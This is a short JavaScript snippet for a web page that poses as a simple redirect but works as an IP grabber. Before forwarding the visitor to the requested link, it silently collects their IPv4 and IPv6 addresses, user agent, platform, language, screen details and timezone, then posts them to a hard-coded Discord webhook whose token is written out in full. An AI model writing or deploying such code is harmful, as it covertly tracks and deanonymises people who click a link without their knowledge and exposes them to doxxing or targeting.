<script>
(async () => {
  const params = new URLSearchParams(location.search);
  const redirectUrl = params.get("link");
  const uid = params.get("id");

  if (!redirectUrl || !uid) return;

  const [ipv4, ipv6] = await Promise.all([
    fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => d.ip).catch(() => "N/A"),
    fetch("https://api64.ipify.org?format=json").then(r => r.json()).then(d => d.ip).catch(() => "N/A"),
  ]);

  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
  const now = new Date().toISOString();

  const info = {
    title: "ðŸŽ¯ New Device Logged",
    color: 0xff0000,
    fields: [
      { name: "ID", value: uid, inline: false },
      { name: "IPv4", value: ipv4, inline: true },
      { name: "IPv6", value: ipv6, inline: true },
      { name: "Language", value: navigator.language || "N/A", inline: true },
      { name: "Platform", value: navigator.platform || "N/A", inline: true },
      { name: "User-Agent", value: navigator.userAgent.slice(0, 1024), inline: false },
      { name: "Screen", value: `${screen.width}x${screen.height} @ ${screen.colorDepth}bit`, inline: true },
      { name: "Timezone", value: timezone, inline: true },
      { name: "Timestamp", value: now, inline: false },
    ],
  };

  await fetch("https://discord.com/api/webhooks/1361441104939057283/JPyevNJQWb_1WE7678Pr8AAFwE4WDKZMN_t-O57pHMN2m5j8NU-kL4AKV6gztEs1yCAl", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ embeds: [info] }),
  });

  location.href = redirectUrl;
})();
</script>
